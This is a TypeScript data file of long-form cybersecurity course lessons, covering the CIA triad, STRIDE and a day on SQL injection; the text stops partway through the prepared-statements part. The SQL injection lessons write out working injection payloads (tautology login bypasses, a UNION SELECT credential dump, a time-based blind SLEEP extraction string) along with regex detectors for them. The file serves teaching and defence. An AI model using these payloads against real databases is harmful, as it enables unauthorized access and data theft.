import { LongLesson } from './longLessons';

/**
 * Enterprise Cybersecurity Engineering & Defense (course-cybersecurity, prefix: cyber):
 * 30 comprehensive long-format lessons (20-30 minutes each, >= 10 spoken minutes)
 * covering CIA triad, STRIDE threat modeling, SQL injection (SQLi),
 * Cross-Site Scripting (XSS), Content Security Policy (CSP), CSRF & SameSite cookies,
 * Web Application Firewall (WAF), cryptographic primitives (AES-GCM, RSA, ECC),
 * password hashing (Argon2id, Bcrypt), Public Key Infrastructure (PKI, X.509, TLS 1.3),
 * JWT security, MFA & TOTP (RFC 6238), RBAC & ABAC authorization, BOLA / IDOR defense,
 * TCP SYN flood & stateful firewalls, secure HTTP headers, SSRF & cloud metadata protection,
 * insecure deserialization, secrets entropy auditing, SBOM & CVE dependency management,
 * API security & rate limiting, binary exploitation (buffer overflows, stack canaries, ASLR),
 * memory safety, SIEM log analysis, IDS/IPS Snort rules, CVSS v3.1 vulnerability scoring,
 * Zero Trust Architecture (BeyondCorp), Cloud IAM & KMS, incident response forensics,
 * and sovereign offensive/defensive operations suite capstone.
 */
export const CYBER_WEB_LONG_LESSONS: LongLesson[] = [
{
  "day": 1,
  "title": "Information Security Core: CIA Triad & STRIDE Threat Modeling",
  "goal": "Master the foundational pillars of enterprise security: The CIA Triad (Confidentiality, Integrity, Availability), STRIDE Threat Modeling, and Defense-in-Depth layered architecture.",
  "minutes": 25,
  "recap": "Welcome to Enterprise Cybersecurity Engineering & Defense. Today we construct the foundational architecture of information security: the CIA triad, STRIDE threat taxonomy, and defense-in-depth principles.",
  "parts": [
    {
      "title": "The CIA Triad & Information Security Axioms",
      "say": [
        "Information security engineering rests on three core pillars known universally as the CIA Triad: Confidentiality, Integrity, and Availability.",
        "Confidentiality guarantees that proprietary data, credentials, and sensitive records are inaccessible to unauthorized entities, processes, or devices.",
        "Integrity ensures that system information remains completely accurate, authentic, and protected against unauthorized modification or deletion.",
        "Availability mandates that authorized principals maintain timely, dependable, and unimpeded access to computing resources, networks, and services.",
        "A secure software system cannot optimize exclusively for one pillar while neglecting the others without introducing catastrophic business risks.",
        "For example, encrypting a database to achieve confidentiality is futile if an unhandled denial-of-service attack wipes out system availability.",
        "Similarly, ensuring round-the-clock availability with wide-open public endpoints completely destroys data confidentiality and regulatory compliance.",
        "Security engineers continually analyze business workflows to balance these three competing constraints against operational performance and user friction.",
        "Every security control, architectural boundary, and encryption cipher introduced throughout this course maps directly back to the CIA triad."
      ],
      "example": "A hospital electronic health record system requires high confidentiality for patient medical histories, absolute integrity to prevent dosage alteration, and non-negotiable availability during emergency room trauma care.",
      "code": "interface SecurityPillar {\n  name: 'Confidentiality' | 'Integrity' | 'Availability';\n  objective: string;\n  threatExample: string;\n  primaryControl: string;\n}\n\nconst ciaTriad: SecurityPillar[] = [\n  {\n    name: 'Confidentiality',\n    objective: 'Prevent unauthorized information disclosure',\n    threatExample: 'Data exfiltration via SQL injection or eavesdropping',\n    primaryControl: 'AES-256 encryption, access control lists, tokenization'\n  },\n  {\n    name: 'Integrity',\n    objective: 'Protect data accuracy and prevent unauthorized alteration',\n    threatExample: 'Tampering with financial ledger or payload alteration',\n    primaryControl: 'HMAC-SHA256, digital signatures, immutable audit logs'\n  },\n  {\n    name: 'Availability',\n    objective: 'Ensure timely and dependable access to computing assets',\n    threatExample: 'DDoS flooding or unhandled resource exhaustion',\n    primaryControl: 'Rate limiting, auto-scaling clusters, redundancy'\n  }\n];\n\nconsole.log('CIA Pillars Defined:', ciaTriad.length);\nciaTriad.forEach(p => console.log(`Pillar: ${p.name} -> Control: ${p.primaryControl}`));",
      "output": "CIA Pillars Defined: 3\nPillar: Confidentiality -> Control: AES-256 encryption, access control lists, tokenization\nPillar: Integrity -> Control: HMAC-SHA256, digital signatures, immutable audit logs\nPillar: Availability -> Control: Rate limiting, auto-scaling clusters, redundancy",
      "codeNotes": [
        {
          "line": 1,
          "note": "Defines the core interface modeling the three universal security objectives."
        },
        {
          "line": 8,
          "note": "Constructs the CIA triad catalog mapping objectives to concrete controls."
        }
      ],
      "tryIt": "Add a second threat example to the Confidentiality pillar representing unencrypted backup tapes.",
      "check": {
        "question": "Which pillar of the CIA Triad is directly violated when an attacker modifies bank account balances in a database?",
        "options": [
          "Confidentiality",
          "Integrity",
          "Availability"
        ],
        "answer": 1,
        "why": "Integrity ensures that data remains accurate and unaltered; unauthorized modification directly violates the integrity pillar."
      }
    },
    {
      "title": "Quantitative & Qualitative Risk Calculation",
      "say": [
        "In enterprise cybersecurity, risk is not an abstract concept but a measurable probability of asset degradation or financial damage.",
        "The standard quantitative risk formula expresses Risk as the product of Threat likelihood, Vulnerability severity, and Business Impact.",
        "A Threat is any circumstance or event with the potential to adversely impact an organizational asset through unauthorized access or destruction.",
        "A Vulnerability is a weakness, flaw, or architectural bug in system security procedures, design, or internal controls.",
        "Impact measures the magnitude of harm, financial loss, regulatory fines, and reputational injury resulting from a successful exploit.",
        "If a high-severity vulnerability exists on an air-gapped system with zero threat exposure, the resulting operational risk remains negligible.",
        "Conversely, even a low-complexity vulnerability on an Internet-facing payment gateway yields catastrophic enterprise risk requiring immediate remediation.",
        "Security architects compute annualized loss expectancy (ALE) to determine whether deploying an expensive security control is financially justified.",
        "Understanding risk modeling prevents engineering organizations from wasting capital on low-impact edge cases while ignoring critical attack surfaces."
      ],
      "example": "An unpatched remote code execution flaw in an internal test runner with no external network access versus an unauthenticated SQL injection on a public checkout API.",
      "code": "interface RiskAssessment {\n  asset: string;\n  threatLikelihood: number; // Scale 1 - 10\n  vulnerabilitySeverity: number; // Scale 1 - 10\n  businessImpact: number; // Scale 1 - 10\n}\n\nfunction calculateRiskScore(assessment: RiskAssessment): { score: number; tier: string } {\n  const score = assessment.threatLikelihood * assessment.vulnerabilitySeverity * assessment.businessImpact;\n  let tier = 'LOW';\n  if (score > 500) tier = 'CRITICAL';\n  else if (score > 250) tier = 'HIGH';\n  else if (score > 100) tier = 'MEDIUM';\n  return { score, tier };\n}\n\nconst checkoutApiRisk = calculateRiskScore({\n  asset: 'Public Checkout API',\n  threatLikelihood: 9,\n  vulnerabilitySeverity: 8,\n  businessImpact: 9\n});\n\nconsole.log('Asset Risk Score:', checkoutApiRisk.score);\nconsole.log('Asset Severity Tier:', checkoutApiRisk.tier);",
      "output": "Asset Risk Score: 648\nAsset Severity Tier: CRITICAL",
      "codeNotes": [
        {
          "line": 8,
          "note": "Computes composite risk product from threat likelihood, vulnerability, and impact."
        },
        {
          "line": 16,
          "note": "Evaluates an internet-facing payment pipeline to derive its critical triage score."
        }
      ],
      "tryIt": "Evaluate an internal documentation wiki with likelihood 2, vulnerability 3, and impact 2 to observe the LOW tier.",
      "check": {
        "question": "What is the primary factor that keeps risk low when a severe zero-day vulnerability exists on an isolated system with no external connectivity?",
        "options": [
          "Zero or near-zero threat likelihood",
          "Infinite business impact",
          "Perfect cryptographic integrity"
        ],
        "answer": 0,
        "why": "Because Risk = Threat x Vulnerability x Impact, if the threat likelihood of reaching the isolated asset is zero, the calculated risk remains minimal."
      }
    },
    {
      "title": "The STRIDE Threat Modeling Taxonomy (Spoofing & Tampering)",
      "say": [
        "Developed by Microsoft security engineers, STRIDE is the industry standard mnemonic taxonomy for decomposing software threat models.",
        "STRIDE stands for Spoofing identity, Tampering with data, Repudiation, Information disclosure, Denial of service, and Elevation of privilege.",
        "Each threat category in STRIDE corresponds directly to the violation of a specific property in information and system security.",
        "Spoofing involves an adversary illegitimately claiming another user or system entity's identity to gain unauthorized access.",
        "Mitigating Spoofing requires robust authentication controls such as strong password hashing, mutual TLS certificates, and multi-factor authentication.",
        "Tampering involves malicious modification of code, configuration files, network packets, or database records in transit or at rest.",
        "Mitigating Tampering mandates integrity validation mechanisms, cryptographic message authentication codes (HMAC), and digital signatures.",
        "By systematically evaluating data flow diagrams against Spoofing and Tampering, engineers uncover architectural flaws before deploying code.",
        "Threat modeling during the design phase is exponentially cheaper than discovering and patching exploitable flaws in production environments."
      ],
      "example": "An attacker modifies a user ID parameter in an API request header from 101 to 102 to spoof an administrator and tamper with another account's balance.",
      "code": "type StrideCategory = 'SPOOFING' | 'TAMPERING';\n\ninterface StrideMitigation {\n  category: StrideCategory;\n  violates: string;\n  attackVector: string;\n  defenseMechanism: string;\n}\n\nconst mitigations: Record<StrideCategory, StrideMitigation> = {\n  SPOOFING: {\n    category: 'SPOOFING',\n    violates: 'Authenticity',\n    attackVector: 'Forging session cookies or IP headers',\n    defenseMechanism: 'Cryptographic JWT verification, mTLS, MFA'\n  },\n  TAMPERING: {\n    category: 'TAMPERING',\n    violates: 'Integrity',\n    attackVector: 'Modifying payment amount in hidden form fields',\n    defenseMechanism: 'HMAC signatures, read-only parameter hashing'\n  }\n};\n\nfunction auditThreatCategory(cat: StrideCategory): string {\n  const m = mitigations[cat];\n  return `Category: ${m.category} | Violates: ${m.violates} | Defense: ${m.defenseMechanism}`;\n}\n\nconsole.log(auditThreatCategory('SPOOFING'));\nconsole.log(auditThreatCategory('TAMPERING'));",
      "output": "Category: SPOOFING | Violates: Authenticity | Defense: Cryptographic JWT verification, mTLS, MFA\nCategory: TAMPERING | Violates: Integrity | Defense: HMAC signatures, read-only parameter hashing",
      "codeNotes": [
        {
          "line": 1,
          "note": "Defines the first two threat categories of the STRIDE taxonomy."
        },
        {
          "line": 24,
          "note": "Audits threat vectors and maps them to standard architectural defenses."
        }
      ],
      "tryIt": "Simulate a tampering detector that checks if a request hash matches the expected HMAC signature.",
      "check": {
        "question": "Which security property is violated when an attacker tampers with an API payload in transit?",
        "options": [
          "Integrity",
          "Non-repudiation",
          "Availability"
        ],
        "answer": 0,
        "why": "Tampering refers to unauthorized modification of data, which directly violates data integrity."
      }
    },
    {
      "title": "STRIDE: Repudiation, Information Disclosure & Denial of Service",
      "say": [
        "Continuing through the STRIDE taxonomy, we encounter Repudiation, Information disclosure, and Denial of service.",
        "Repudiation occurs when an actor performs an action or transaction and subsequently denies involvement without the system having irrefutable proof.",
        "Non-repudiation is enforced through write-once immutable audit logs, digital signatures, and synchronized trusted timestamps.",
        "Information disclosure occurs when private data, stack traces, credentials, or encryption keys are leaked to unauthorized spectators.",
        "Mitigating information disclosure requires robust data encryption at rest and in transit, strict authorization boundaries, and error sanitization.",
        "Denial of service (DoS) attacks seek to render systems, networks, or databases unusable for legitimate users by exhausting hardware or network resources.",
        "Mitigating DoS demands multi-layered rate limiting, asynchronous message buffering, CDN caching, and elastic autoscaling architectures.",
        "Each of these three threat types attacks a different layer of the application lifecycle and operational runtime environment.",
        "Documenting these threats in design reviews guarantees that auditability, confidentiality, and resilience are built into system specifications."
      ],
      "example": "A rogue employee initiates a wire transfer and claims their computer was hacked; immutable cryptographically signed audit logs prove their key signed the transaction.",
      "code": "type StrideSecondary = 'REPUDIATION' | 'INFORMATION_DISCLOSURE' | 'DENIAL_OF_SERVICE';\n\ninterface ThreatRecord {\n  type: StrideSecondary;\n  target: string;\n  mitigationStrategy: string;\n}\n\nconst auditRecords: ThreatRecord[] = [\n  {\n    type: 'REPUDIATION',\n    target: 'Banking Wire Transfer',\n    mitigationStrategy: 'Cryptographic non-repudiation via SHA-256 signed audit trail'\n  },\n  {\n    type: 'INFORMATION_DISCLOSURE',\n    target: 'User Profile API',\n    mitigationStrategy: 'Field-level PII masking and TLS 1.3 payload encryption'\n  },\n  {\n    type: 'DENIAL_OF_SERVICE',\n    target: 'Login Endpoint',\n    mitigationStrategy: 'Sliding window rate limiting with IP reputation scoring'\n  }\n];\n\nauditRecords.forEach(r => {\n  console.log(`[${r.type}] Target: ${r.target} -> Strategy: ${r.mitigationStrategy}`);\n});",
      "output": "[REPUDIATION] Target: Banking Wire Transfer -> Strategy: Cryptographic non-repudiation via SHA-256 signed audit trail\n[INFORMATION_DISCLOSURE] Target: User Profile API -> Strategy: Field-level PII masking and TLS 1.3 payload encryption\n[DENIAL_OF_SERVICE] Target: Login Endpoint -> Strategy: Sliding window rate limiting with IP reputation scoring",
      "codeNotes": [
        {
          "line": 1,
          "note": "Defines the secondary triplet of the STRIDE threat categorization framework."
        },
        {
          "line": 8,
          "note": "Maps critical architectural targets to non-repudiation, confidentiality, and availability controls."
        }
      ],
      "tryIt": "Add a database crash scenario to DENIAL_OF_SERVICE with connection pool limits as the mitigation.",
      "check": {
        "question": "What is the primary technical defense against Repudiation threats in financial transaction systems?",
        "options": [
          "Compressing API responses with Gzip",
          "Immutable, timestamped audit logging and digital signatures",
          "Increasing database connection pool limits"
        ],
        "answer": 1,
        "why": "Non-repudiation requires immutable, cryptographically verifiable records proving that an identity performed a specific action at a specific time."
      }
    },
    {
      "title": "Elevation of Privilege & Attack Surface Analysis",
      "say": [
        "The final category of STRIDE is Elevation of Privilege, where an adversary with limited permissions acquires unauthorized administrative rights.",
        "Elevation attacks occur through missing authorization checks, insecure direct object references, or kernel and runtime vulnerabilities.",
        "Attack surface analysis is the systematic process of identifying, mapping, and minimizing all points where an unauthorized user can interact with the system.",
        "Every open network port, exposed REST route, unauthenticated microservice endpoint, and human user input expands the overall attack surface.",
        "The principle of least privilege dictates that every module, user, and background worker must possess only the bare minimum permissions required.",
        "Hardening an attack surface involves disabling unused services, closing redundant network ports, and enforcing strict role-based access control.",
        "Modern cloud security mandates zero-trust networking where internal microservice-to-microservice traffic is verified as rigorously as public internet requests.",
        "Regular architectural threat reviews ensure that newly developed endpoints do not inadvertently create privilege escalation tunnels.",
        "Minimizing your attack surface directly diminishes the probability of an attacker establishing a foothold inside your corporate infrastructure."
      ],
      "example": "A regular customer changes their role field in a profile update JSON payload from 'user' to 'admin', gaining access to the administrative management console.",
      "code": "interface UserIdentity {\n  id: string;\n  role: 'GUEST' | 'USER' | 'ADMIN';\n  permissions: string[];\n}\n\nfunction verifyPrivilege(identity: UserIdentity, requiredPermission: string): { allowed: boolean; status: string } {\n  if (identity.permissions.includes(requiredPermission)) {\n    return { allowed: true, status: 'ACCESS_GRANTED' };\n  }\n  return { allowed: false, status: 'SECURITY_ALERT_UNAUTHORIZED_ELEVATION_ATTEMPT' };\n}\n\nconst standardUser: UserIdentity = {\n  id: 'usr_4401',\n  role: 'USER',\n  permissions: ['profile:read', 'profile:update']\n};\n\nconst res1 = verifyPrivilege(standardUser, 'profile:read');\nconst res2 = verifyPrivilege(standardUser, 'system:backup_export');\n\nconsole.log('Read Status:', res1.status);\nconsole.log('Export Status:', res2.status);",
      "output": "Read Status: ACCESS_GRANTED\nExport Status: SECURITY_ALERT_UNAUTHORIZED_ELEVATION_ATTEMPT",
      "codeNotes": [
        {
          "line": 7,
          "note": "Validates explicit permissions against required authorization scopes."
        },
        {
          "line": 19,
          "note": "Detects unauthorized attempts to invoke administrative capabilities without escalation."
        }
      ],
      "tryIt": "Add an ADMIN identity that possesses the 'system:backup_export' permission and verify its access is granted.",
      "check": {
        "question": "Which security principle directly prevents Elevation of Privilege by strictly restricting user permissions to only required actions?",
        "options": [
          "Security through obscurity",
          "Principle of Least Privilege",
          "Optimistic concurrency control"
        ],
        "answer": 1,
        "why": "The Principle of Least Privilege restricts actors to the bare minimum set of permissions necessary to execute their duties."
      }
    },
    {
      "title": "Defense-in-Depth Multi-Tier Architectural Audit",
      "say": [
        "Defense-in-Depth is an architectural philosophy that deploys multiple layered defensive mechanisms across every tier of the technology stack.",
        "The premise of Defense-in-Depth is that any single security control can, and eventually will, fail or be bypassed by a sophisticated adversary.",
        "If a network perimeter firewall is compromised, application-level authentication and input sanitization must prevent data breach.",
        "If an attacker successfully exploits an application vulnerability to execute code, host-level sandboxing and least-privilege IAM policies contain the blast radius.",
        "If an attacker penetrates the database host, cryptographic encryption at rest ensures that stolen disk contents remain unreadable ciphertext.",
        "The primary defensive tiers include Edge and CDN protection, Network firewalls, Compute hardening, Application security, and Storage encryption.",
        "A comprehensive security audit systematically inspects each defensive layer to ensure there are no single points of failure.",
        "Combining STRIDE threat modeling with Defense-in-Depth produces resilient, enterprise-grade software capable of surviving active nation-state threats.",
        "Throughout this course, we will implement concrete algorithmic and cryptographic solutions across every single one of these defensive tiers."
      ],
      "example": "A bank implements DDoS filtering at the Cloudflare edge, a WAF for SQLi filtering, JWT validation on APIs, parameterized queries on databases, and AES-256 on disks.",
      "code": "interface DefenseTier {\n  layer: string;\n  control: string;\n  isOperational: boolean;\n}\n\nfunction auditDefenseInDepth(tiers: DefenseTier[]): { passed: boolean; score: string; failedLayers: string[] } {\n  const failed = tiers.filter(t => !t.isOperational).map(t => t.layer);\n  const passed = failed.length === 0;\n  const score = `${tiers.length - failed.length}/${tiers.length}`;\n  return { passed, score, failedLayers: failed };\n}\n\nconst enterpriseTiers: DefenseTier[] = [\n  { layer: 'Edge / CDN', control: 'Cloudflare DDoS Mitigation', isOperational: true },\n  { layer: 'Network', control: 'AWS Security Groups & VPC Peering', isOperational: true },\n  { layer: 'Application', control: 'Input Sanitization & CSRF Defense', isOperational: true },\n  { layer: 'Data Storage', control: 'AES-256-GCM Envelope Encryption', isOperational: true }\n];\n\nconst auditResult = auditDefenseInDepth(enterpriseTiers);\nconsole.log('Defense-in-Depth Audit Passed:', auditResult.passed);\nconsole.log('Layer Score:', auditResult.score);",
      "output": "Defense-in-Depth Audit Passed: true\nLayer Score: 4/4",
      "codeNotes": [
        {
          "line": 7,
          "note": "Inspects multi-tier defensive controls to identify missing or compromised security layers."
        },
        {
          "line": 14,
          "note": "Defines four distinct security tiers covering edge, network, application, and data storage."
        }
      ],
      "tryIt": "Set isOperational to false on the Application layer to observe audit failure and remediation warnings.",
      "check": {
        "question": "What is the core rationale behind implementing Defense-in-Depth?",
        "options": [
          "To eliminate the need for software testing",
          "To ensure that if one security control fails, secondary controls contain the attack",
          "To speed up database query execution"
        ],
        "answer": 1,
        "why": "Defense-in-Depth ensures redundancy so that the breach of any single defensive layer does not lead to total system compromise."
      }
    }
  ],
  "summary": [
    "The CIA Triad (Confidentiality, Integrity, Availability) forms the cornerstone of all information security architecture.",
    "Quantitative risk modeling balances Threat likelihood, Vulnerability severity, and Business impact to prioritize remediation.",
    "STRIDE provides a comprehensive mnemonic taxonomy: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege.",
    "The Principle of Least Privilege and attack surface reduction strictly constrain the blast radius of potential compromises.",
    "Defense-in-Depth establishes resilient, overlapping security barriers across Edge, Network, Application, and Data tiers."
  ],
  "projectStep": {
    "title": "Project Step 1: Enterprise Security Architecture & Threat Matrix",
    "steps": [
      "Define strongly-typed data structures for CIA objectives, STRIDE classifications, and multi-tier defensive controls.",
      "Implement a threat evaluation engine that maps inbound security risks to concrete architectural mitigations.",
      "Execute an automated Defense-in-Depth compliance validator certifying that zero single points of failure exist."
    ]
  }
},
{
  "day": 2,
  "title": "Web Security: SQL Injection (SQLi) & Parameterized Queries",
  "goal": "Defend relational databases against injection attacks: Tautology attacks, Piggybacked queries, Blind and Time-Based SQLi, and Defense via Parameterized Prepared Statements.",
  "minutes": 25,
  "recap": "Today we tackle the classic and devastating vulnerability of SQL Injection, deconstruct string concatenation flaws, and implement pre-compiled prepared statements.",
  "parts": [
    {
      "title": "Anatomy of SQL Injection & Dynamic String Concatenation Flaws",
      "say": [
        "SQL injection occurs when untrusted user input is directly concatenated into a dynamic SQL query string before being sent to the database engine.",
        "The relational database parser cannot inherently differentiate between the developer's intended SQL commands and attacker-supplied syntactic tokens.",
        "When an attacker injects single quotes, semicolons, or boolean expressions, they alter the Abstract Syntax Tree (AST) constructed by the query compiler.",
        "This structural mutation allows adversaries to bypass authentication, read confidential tables, modify financial records, or execute arbitrary operating system commands.",
        "Despite being documented for over two decades, SQL injection remains one of the most widespread and catastrophic web vulnerabilities.",
        "Dynamic query builders that rely on raw string templates, string formatting, or naive concatenation are fundamentally broken by design.",
        "Understanding how the SQL lexical analyzer breaks query strings into tokens reveals why string-based sanitization frequently fails.",
        "Blacklisting malicious keywords like SELECT or UNION is easily defeated using case variations, URL encoding, or nested comment tricks.",
        "The only foolproof defense is separating the query logic definition from the runtime data parameters through prepared statements."
      ],
      "example": "A backend service builds a query with `SELECT * FROM users WHERE email = '` + email + `'`; an attacker supplies `admin@corp.com' --` to truncate the password check.",
      "code": "function buildVulnerableQuery(userEmail: string): string {\n  return `SELECT id, email, role FROM users WHERE email = '${userEmail}' AND is_active = 1;`;\n}\n\nconst safeInput = 'engineer@enterprise.io';\nconst maliciousInput = \"admin@corp.com' OR '1'='1\";\n\nconsole.log('Safe Query:', buildVulnerableQuery(safeInput));\nconsole.log('Exploited Query:', buildVulnerableQuery(maliciousInput));",
      "output": "Safe Query: SELECT id, email, role FROM users WHERE email = 'engineer@enterprise.io' AND is_active = 1;\nExploited Query: SELECT id, email, role FROM users WHERE email = 'admin@corp.com' OR '1'='1' AND is_active = 1;",
      "codeNotes": [
        {
          "line": 1,
          "note": "Demonstrates unsafe string interpolation directly concatenating untrusted parameters into SQL."
        },
        {
          "line": 7,
          "note": "Reveals how the attacker injected a tautology payload that alters the boolean logic of the query."
        }
      ],
      "tryIt": "Pass a comment sequence like `admin@corp.com' --` to see how the active check condition is truncated.",
      "check": {
        "question": "Why is dynamic string concatenation vulnerable to SQL injection?",
        "options": [
          "Because string concatenation runs slower than binary operations",
          "Because the database parser treats injected characters as executable SQL syntax instead of literal data",
          "Because databases only accept lowercase queries"
        ],
        "answer": 1,
        "why": "When strings are concatenated, user input becomes part of the SQL grammar parsed into the database's AST."
      }
    },
    {
      "title": "Tautology Exploits & Authentication Bypasses",
      "say": [
        "A tautology attack is an injection exploit that crafts a SQL boolean expression that unconditionally evaluates to true for every database record.",
        "The classic tautology payload `OR '1'='1` transforms a restrictive query into an all-inclusive retrieval of every row in the target table.",
        "In authentication handlers, tautology injections trick queries into returning the very first user record in the database, which is almost always the administrator.",
        "Consider `SELECT * FROM accounts WHERE username = 'admin' AND password = '` + pass + `'`; injecting `' OR '1'='1` nullifies the password verification.",
        "Because boolean operator precedence in SQL evaluates AND before OR, the expression `username = 'admin' AND password = '' OR '1'='1` evaluates to true.",
        "Furthermore, modern databases support inline comment characters such as double hyphens or hashes to discard the remainder of the query.",
        "When an attacker inputs `admin'--`, the database ignores the entire password verification clause completely.",
        "Detecting tautology attacks requires understanding how logical operators are compiled inside SQL query execution plans.",
        "Let us simulate how an authentication validator identifies whether an input string contains raw boolean tautology tokens."
      ],
      "example": "Logging into an administrative portal by entering `admin' --` in the username field and leaving the password field completely blank.",
      "code": "function detectTautologyPattern(input: string): { isSuspicious: boolean; detectedPattern: string | null } {\n  const tautologyRegex = /('\\s*(OR|or|oR|Or)\\s*'?[^'\\s]+'?\\s*=\\s*'?[^'\\s]+'?)|(--|#|\\/\\*)/;\n  const match = input.match(tautologyRegex);\n  if (match) {\n    return { isSuspicious: true, detectedPattern: match[0] };\n  }\n  return { isSuspicious: false, detectedPattern: null };\n}\n\nconst cleanUser = 'sarah_connor';\nconst attackUser = \"admin' OR '1'='1\";\n\nconsole.log('Clean Check:', detectTautologyPattern(cleanUser).isSuspicious);\nconsole.log('Attack Check:', detectTautologyPattern(attackUser).isSuspicious);\nconsole.log('Detected Token:', detectTautologyPattern(attackUser).detectedPattern);",
      "output": "Clean Check: false\nAttack Check: true\nDetected Token: ' OR '1'='1",
      "codeNotes": [
        {
          "line": 2,
          "note": "Defines regular expression matching classic OR-based tautology and comment indicators."
        },
        {
          "line": 12,
          "note": "Flags the injected boolean condition altering the intended query logic."
        }
      ],
      "tryIt": "Test with `-- comment` to verify that comment delimiters trigger the suspicious pattern detector.",
      "check": {
        "question": "In the SQL expression `WHERE user = 'a' AND pass = '' OR '1'='1'`, why does the query succeed?",
        "options": [
          "Because SQL throws an error and falls back to default admin access",
          "Because AND has higher precedence, and the final `OR '1'='1'` condition makes the entire clause true",
          "Because '1'='1' instructs the database to delete the table"
        ],
        "answer": 1,
        "why": "Due to operator precedence, `(user = 'a' AND pass = '')` evaluates to false, but `false OR true` evaluates unconditionally to true."
      }
    },
    {
      "title": "Piggybacked Queries, Union-Based Injections & Schema Enumeration",
      "say": [
        "Beyond bypassing login screens, advanced SQL injection attacks extract sensitive records from unrelated tables using UNION operators.",
        "A UNION-based injection merges the result set of the original developer query with a secondary attacker-crafted SELECT query.",
        "To execute a successful UNION attack, the injected query must return the exact same number of columns and compatible data types as the primary query.",
        "Attackers determine column counts systematically by injecting `ORDER BY 1`, `ORDER BY 2`, until the database raises an out-of-range error.",
        "Once column counts match, the attacker queries system metadata tables such as `information_schema.tables` and `information_schema.columns`.",
        "This allows the attacker to comprehensively map the entire database structure, discover hidden tables, and locate password hashes.",
        "In database engines supporting multiple statements separated by semicolons, attackers execute piggybacked queries such as `DROP TABLE customers;`.",
        "Piggybacked queries can completely drop tables, update administrative privileges, or insert backdoors directly into the database.",
        "Preventing UNION and piggybacked attacks necessitates strict database connection permissions in addition to parameterized statements."
      ],
      "example": "Injecting `' UNION SELECT id, username, password_hash FROM admin_credentials --` into a public product search bar to dump company credentials.",
      "code": "interface ColumnAudit {\n  injectedQuery: string;\n  injectedUnionColumns: number;\n  extractedTable: string;\n}\n\nfunction parseUnionPayload(sql: string): ColumnAudit | null {\n  const unionRegex = /UNION\\s+SELECT\\s+([^;]+)/i;\n  const match = sql.match(unionRegex);\n  if (!match) return null;\n  \n  const columns = match[1].split(',').map(c => c.trim());\n  const fromMatch = sql.match(/FROM\\s+([a-zA-Z0-9_]+)/i);\n  return {\n    injectedQuery: sql,\n    injectedUnionColumns: columns.length,\n    extractedTable: fromMatch ? fromMatch[1] : 'unknown'\n  };\n}\n\nconst payload = \"1' UNION SELECT username, password, email FROM admin_users --\";\nconst audit = parseUnionPayload(payload);\n\nconsole.log('Union Detected:', audit !== null);\nconsole.log('Injected Column Count:', audit?.injectedUnionColumns);\nconsole.log('Target Extraction Table:', audit?.extractedTable);",
      "output": "Union Detected: true\nInjected Column Count: 3\nTarget Extraction Table: admin_users",
      "codeNotes": [
        {
          "line": 8,
          "note": "Extracts and parses injected UNION SELECT statements attempting schema exfiltration."
        },
        {
          "line": 20,
          "note": "Demonstrates decomposition of column count and target table from attacker payload."
        }
      ],
      "tryIt": "Modify the payload to select four columns and observe how the injected column count updates.",
      "check": {
        "question": "What technical constraint must an attacker satisfy when executing a UNION-based SQL injection?",
        "options": [
          "The injected query must have the exact same number and compatible types of columns as the original query",
          "The database must be running on Linux",
          "The query must use exclusively uppercase characters"
        ],
        "answer": 0,
        "why": "The SQL standard mandates that UNION operations must join queries with identical column counts and matching data types."
      }
    },
    {
      "title": "Blind & Time-Based Inference Attacks",
      "say": [
        "In hardened production environments, applications frequently suppress database error messages and never reflect query results directly on the screen.",
        "Under these constraints, attackers utilize Blind SQL Injection techniques to extract data one bit at a time using boolean or time-based inference.",
        "In Boolean-Based Blind SQLi, the attacker injects conditions like `AND SUBSTRING(password, 1, 1) = 'a'` and observes whether the webpage renders normally.",
        "If the character matches, the webpage displays a standard response; if it fails, the page shows a missing item or slightly different content.",
        "In Time-Based Blind SQLi, the attacker forces the database execution thread to sleep for several seconds using functions like `SLEEP(5)` or `pg_sleep(5)`.",
        "If the HTTP response takes five seconds to return, the injected boolean condition was true; if it returns instantly, the condition was false.",
        "Using binary search across ASCII character codes, an automated tool like sqlmap can exfiltrate entire databases in minutes over blind channels.",
        "Blind SQL injection proves that hiding error messages is merely security through obscurity and does not prevent catastrophic data exfiltration.",
        "Only pre-compiled parameterized queries completely eliminate blind SQL injection attack vectors."
      ],
      "example": "Sending `1' AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1)) = 97, SLEEP(3), 0) --` to test if the first password character is 'a'.",
      "code": "function simulateTimeBasedInference(injectedCondition: boolean, delaySec: number): { elapsedMs: number; deducedBit: boolean } {\n  const start = Date.now();\n  if (injectedCondition) {\n    // Simulate database sleep delay\n    const target = start + (delaySec * 100);\n    while (Date.now() < target) { /* blocking sleep */ }\n  }\n  const elapsed = Date.now() - start;\n  return { elapsedMs: elapsed, deducedBit: injectedCondition };\n}\n\nconst test1 = simulateTimeBasedInference(true, 1);\nconst test2 = simulateTimeBasedInference(false, 1);\n\nconsole.log('True Condition Delay (ms):', test1.elapsedMs >= 100);\nconsole.log('True Deduced Bit:', test1.deducedBit);\nconsole.log('False Condition Delay (ms):', test2.elapsedMs < 50);\nconsole.log('False Deduced Bit:', test2.deducedBit);",
      "output": "True Condition Delay (ms): true\nTrue Deduced Bit: true\nFalse Condition Delay (ms): true\nFalse Deduced Bit: false",
      "codeNotes": [
        {
          "line": 1,
          "note": "Simulates time-based inference where true boolean assertions induce measurable latency."
        },
        {
          "line": 13,
          "note": "Demonstrates how client latency timing unambiguously reveals binary data bits."
        }
      ],
      "tryIt": "Change the delay to 2 seconds and verify that the timing discrepancy remains distinct.",
      "check": {
        "question": "How does an attacker extract database records when no errors or data are returned in the HTTP response?",
        "options": [
          "By measuring HTTP response latency when injecting conditional time-delay commands like SLEEP()",
          "By brute-forcing SSH keys on the database server",
          "By disabling the web server's SSL certificate"
        ],
        "answer": 0,
        "why": "Time-based blind SQLi leverages conditional execution delays (e.g. SLEEP) to infer data bit by bit through response latency."
      }
    },
    {
      "title": "Parameterized Prepared Statements & AST Pre-compilation",
      "say": [
        "The definitive, industry-standard defense against all forms of SQL injection is the parameterized prepared statement.",
        "A prepared statement splits database query execution into two distinct and completely decoupled phases: preparation and execution.",
        "During the preparation phase, the application transmits the SQL query template with placeholders like `$1` or `?` to the database engine.",
        "The database parses the query template, validates table and column identifiers, and compiles an immutable Abstract Syntax Tree (AST).",
        "During the execution phase, the application binds untrusted user input values directly to the designated parameter placeholders.",
        "The database engine treats these bound parameters purely as literal scalar values, never re-parsing or evaluating them as executable SQL commands.",
